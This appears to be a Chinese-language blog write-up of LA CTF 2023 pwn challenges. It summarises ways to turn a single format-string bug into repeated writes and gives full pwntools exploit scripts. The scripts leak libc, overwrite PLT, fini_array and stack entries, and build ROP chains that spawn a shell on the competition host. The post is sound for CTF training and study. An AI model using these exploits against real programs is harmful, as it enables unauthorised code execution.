---
title: 2023LACTF部分pwn题解
id: 124
date: 2024-01-09 20:09:12
auther: yrl
cover: 
excerpt: 前言做2023lactf，发现一大堆fmt，这里总结下只有一次fmt时怎么利用情况一次fmt，printf在main中，printf后还有函数（函数首次调用，如puts）fmt修改puts的plt为main（或csu7个pop）实现多次利用后续在stack中布置rop拿shell一次fmt，prin
permalink: /archives/2023lactf%E9%83%A8%E5%88%86pwn%E9%A2%98%E8%A7%A3
categories:
 - pwn-wp
 - ctf
 - writeups
tags: 
 - fmt
---

# 前言
做2023lactf，发现一大堆fmt，这里总结下只有一次fmt时怎么利用

# 情况

1. 一次fmt，printf在main中，printf后还有函数（函数首次调用，如puts）
   - fmt修改puts的plt为main（或csu7个pop）实现多次利用
   - 后续在stack中布置rop拿shell
2. 一次fmt，printf后没有函数首次调用，fmt不在main中，即fmt所在函数的返回地址是程序text短地址
   - 可修fmt所在函数返回地址为main，实现多次利用
3. 一次fmt，printf在main中，printf后没有函数首次调用，没开RELRO，fini_array可写
   - fmt修改fini_array为main实现多次利用
4. 一次fmt，printf在main中，printf后没有函数首次调用，开Partial RELRO，fini_array不可写
   - 修改栈上的偏移间接修改dl_fini中call r14的值为bss段上布置的main，实现第二次利用。
5. 一次fmt，printf不再在main中（存在ebp链），printf后没有函数首次调用，开Partial RELRO，fini_array不可写
   - 修改栈上的ebp，抬高ebp，修改返回地址为main，使得下一次栈在可控的buf内部，构造rop即可拿shell

另外，**一次fmt可以同时进行泄露和写入，但写入的地址先后不能有依赖**，
对于fmt写入数据偏移的计算，是按照在写入之前输出的字符个数决定的而不是前面payload的长度，
例子：
`aaaaaaaa%39c%21$hnn`这个最终写入的数据是8+39
`%26$paaa%39c%21hnn`这个最终写入的数据是14 + 3 + 39（14是输出的地址的长度）
在写入之前，写入的fmt本身长度不算在已输出的字符串个数内。总而言之一句话，写入之前**只看当前printf输出了多少字符**。

# rickroll（fmt、不可写fini_arry）

[附件](https://github.com/D1ag0n-Young/IMG/tree/master/Pwn/2023LACTF/pwn/rickroll)
题目开启了Partial RELRO，导致fini_array不可写，需要构造fmt多次利用。看下伪代码：
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[256]; // [rsp+0h] [rbp-100h] BYREF

  if ( main_called )
  {
    puts("nice try");
    return 1;
  }
  else
  {
    main_called = 1;
    setbuf(stdout, 0LL);
    printf("Lyrics: ");
    fgets(s, 256, stdin);
    printf("Never gonna give you up, never gonna let you down\nNever gonna run around and ");
    printf(s);
    puts("Never gonna make you cry, never gonna say goodbye\nNever gonna tell a lie and hurt you");
    return 0;
  }
}
```
发现这个题只有一次fmt，且后面有首次puts调用，
## 方法一：

可以考虑利用fmt修改puts的plt项为csu的7个pop，从而实现多次利用，也可以实现在栈内ROP。

1. 提前在栈内写入main地址
2. 利用fmt泄露libc，并修改puts的plt为csu的后半部分的pop，返回main
3. 再次在栈内布置ROP，实现getshell

这应该是官方解法，对于这个题目来说比较简单，这也是为什么printf后面为什么会有首次调用的puts。

给出exp：
```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./rickroll"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    #io = process(vuln_path)
    io = process([vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("lac.tf", 31135)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


offset = 6
pop_rdi = 0x000000000040125b

payload = b"%39$018p%238c%13$hhn11111"
payload += f"%73c%14$hhn%196c%15$hhn".encode()
lenp = len(payload)
payload += p64(0x401152)
payload = payload.ljust(56, b"\0")
payload += pack(0x40406C)
payload += pack(0x404018) #plt puts
payload += pack(0x404018 + 1)

ddebug("b *0x40124e") # pop7
io.sendlineafter("Lyrics:", payload)

io.recvuntil("run around and ")
libc_start_main = int(io.recv(18), 16)
libc.address = libc_start_main - libc.symbols["__libc_start_main"] - 234
success("libc address -> " + hex(libc.address))

payload = b"a" * lenp
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.symbols["system"])

io.sendlineafter("Lyrics:", payload)
io.interactive()
```

## 方法二：
这里给出另外一个解法，此题fini_array不可写，但是可以通过一定的偏移来控制dl_fini中的函数调用，从而增加一次利用机会。假如此题没有puts函数，就可以通过此种方法进行利用。

这里说一下如何控制dl_fini中的函数调用：
知道程序正常退出的时候会返回调用libc_start_main，进而调用exit，exit会进入到`_dl_fini`中，函数中存在下面的语句进行调用
![image-1676283976185](/upload/2023/02/image-1676283976185.png)
r14固定是`.fini_array:0000000000403E18`的地址，通过rsi来控制偏移fini_array的偏移，在往上rsi是r15赋值的，而r15是栈上的一个地址（与fmt偏移是58），可以通过控制r15的值来控制调用fini_array的第几项；
![image-1676296857849](/upload/2023/02/image-1676296857849.png)
![image-1676297101676](/upload/2023/02/image-1676297101676.png)
可以提前将r15栈上位置写入适当偏移，使其能指向bss段已经布置好的地址（或rop链），如下图：
![image-1676297334902](/upload/2023/02/image-1676297334902.png)
此时程序返回到main函数，可进行再次利用，这里选用的是直接返回到main中的fgets，发现由于栈帧不平衡，导致rbp向上移动，我们可以直接通过fgets覆盖main函数的返回地址为onegadget；但是实际上在覆盖后在fgets内部已经由于站不平衡导致程序退出了，可以看到是返回到了我们的padding地址上，这也是我们最想看到的，因为这代表我们能够控制返回地址
![image-1676297770563](/upload/2023/02/image-1676297770563.png)
确定好溢出偏移后，覆盖fgets内部函数的返回地址为onegadget。
注意补丁为onegadget创造条件，用`\x00`填充。

exp：
```python
# -*- coding: UTF-8 -*-
from pwn import *
import sys
from pwnlib.util.iters import mbruteforce 

context.log_level = 'debug'
python_version = sys.version_info.major
context.terminal = ["/bin/tmux","sp","-h"]
context(arch='amd64',os='linux')

debug = False if "r" in sys.argv else True

vuln_name = "./rickroll"
libc_path = "./libc.so.6"

elf, rop = ELF(vuln_name), ROP(vuln_name)
libc, roplibc = ELF(libc_path), ROP(libc_path)
os.system("chmod +x " + vuln_name)

if debug:
    io = process([vuln_name],env={'LD_PRELOAD':libc_path})
else:
    io = remote("lac.tf", 31135)

def debug(gdb_script=None):
    gdb.attach(io)
    pause()
    
l64 = lambda      :u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
l32 = lambda      :u32(io.recvuntil(b"\xf7")[-4:].ljust(4,b"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a.encode(),b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x.encode()) if python_version == 3 and type(x) == str else io.sendline(x)
sa = lambda a,b		: io.sendafter(a.encode(),b.encode()) if python_version == 3 and type(b) == str else io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a.encode(),b.encode()) if python_version == 3 and type(b) == str else io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : debug(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, b'\x00'))
uu64 = lambda data		: u64(data.ljust(8, b'\x00'))
ur64 = lambda data		: u64(data.rjust(8, b'\x00'))


fini = 0x403e18
# modify 0x40406c = 0 , modify fini_array offset points to fgets in main
pay = '%39$paaa%239c%12$hhn%232c%58$hn%4036c%13$hnaaaaa' + p64(0x40406c) + p64(0x404000)
debug()
sla('Lyrics: ',pay)	
ru("run around and ")
libc.address = int(io.recv(14), 16) - 0x23d0a
lg('libc.address')
one = libc.address + 0xc961a
lg('one')

# Overwrite fgets internal return address is one
pay = p64(0)*10 + p64(one)
sl(pay)	
irt()
```
# rut_roh_relro(stack pivot、fmt)

[附件](https://github.com/D1ag0n-Young/IMG/tree/master/Pwn/2023LACTF/pwn/rut_roh_relro)
```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./rut_roh_relro"
libc_path = "./libc.so.6"
ld_path = "./ld-2.31.so"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    io = process(vuln_path)
    #io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("lac.tf", 31134)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


delta = 0x7fff50afc8b0 - 0x7fff50afc5c0
libcdelate = 0x7f57df429d0a - 0x7f57df406000
elfdelate = 0x56509590e220 - 0x0056509590d000

payload = "%68$p-%71$p-%70$p"
io.sendlineafter("to post?\n", payload)
io.recvuntil("\n")
rbp_0x200 = int(io.recvuntil("-")[:-1], 16) - delta
success("rsp -> " + hex(rbp_0x200))
libc.address = int(io.recvuntil("-")[:-1], 16) - libcdelate
success("libcaddress -> " + hex(libc.address))
elf.address = int(io.recvuntil("\n"), 16) - elfdelate
success("elfcaddress -> " + hex(elf.address))

leave_ret = elf.address + 0x0000000000001217
ret = elf.address + 0x0000000000001016
pop_rdi = elf.address + 0x000000000000127b

print(libc.symbols["system"])

write_dict = {rbp_0x200 + 0x200: rbp_0x200 + 224, rbp_0x200 + 0x208: leave_ret}
payload = fmtstr_payload(6, write_dict, write_size="byte")
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(ret)
payload += p64(libc.symbols["system"])

io.sendlineafter("like to post?", payload)

io.interactive()
```